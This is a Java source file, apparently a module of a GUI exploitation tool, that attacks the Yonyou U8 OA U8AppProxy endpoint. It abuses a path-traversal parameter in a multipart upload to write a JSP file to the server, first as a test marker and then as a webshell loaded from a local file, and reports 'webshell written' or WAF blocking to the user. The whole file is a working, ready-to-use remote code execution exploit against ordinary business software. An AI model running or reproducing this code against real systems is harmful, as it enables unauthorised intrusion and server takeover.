package exp.oa.yongyou;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;
import utils.shell;

import java.util.HashMap;

public class yongyou_U8_AppProxy implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea) {
        return att(url,textArea);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return shell(url,textArea);
    }

    private Boolean att(String url, TextArea textArea){
        HashMap<String,String> head = new HashMap<>();
        head.put("Content-Type","multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b");

        String upload = "--59229605f98b8cf290a7b8908b34616b\n" +
                "Content-Disposition: form-data; name=\"file\"; filename=\"1.jsp\"\n" +
                "Content-Type: image/png\n" +
                "\n" +
                "<% out.println(\"" + shell.test_payload + "\");%>\n" +
                "--59229605f98b8cf290a7b8908b34616b--";

        Response post = HttpTools.post(url + "/U8AppProxy?gnid=myinfo&id=saveheader&zydm=..%2F..%2Fhello_U8", upload, head, "utf-8");

        Response response = HttpTools.get(url + "/hello_U8.jsp", new HashMap<String, String>(), "utf-8");

        if(response.getCode() == 200 && response.getText().contains(shell.test_payload)){
            Platform.runLater(() -> {
                textArea.appendText(
                        "\n 漏洞存在，测试文件写入成功 " + url + "/hello_U8.jsp"
                );
            });
            return true;
        }else {
            Platform.runLater(() -> {
                textArea.appendText(
                        "\n yongyou_U8_AppProxy-upload-RCE - 漏洞不存在 (出现误报请联系作者)"
                );
            });
            return false;
        }
    }

    private Boolean shell(String url, TextArea textArea){
        HashMap<String,String> head = new HashMap<>();
        head.put("Content-Type","multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b");

        String upload = "--59229605f98b8cf290a7b8908b34616b\n" +
                "Content-Disposition: form-data; name=\"file\"; filename=\"1.jsp\"\n" +
                "Content-Type: image/png\n" +
                "\n" +
                "<% out.println(\"" + shell.readFile(shell.Jsppath) + "\");%>\n" +
                "--59229605f98b8cf290a7b8908b34616b--";

        Response post = HttpTools.post(url + "/U8AppProxy?gnid=myinfo&id=saveheader&zydm=..%2F..%2Fhello_U8", upload, head, "utf-8");

        Response response = HttpTools.get(url + "/hello_U8.jsp", new HashMap<String, String>(), "utf-8");

        if(response.getCode() == 200 && response.getText().contains(shell.test_payload)){
            Platform.runLater(() -> {
                textArea.appendText(
                        "\n 漏洞存在，webshell文件写入成功 " + url + "/hello_U8.jsp"
                );
            });
            return true;
        }else {
            Platform.runLater(()->{
                textArea.appendText("\n waf拦截！！！请手动复现！！！");
            });
            return false;
        }
    }



}
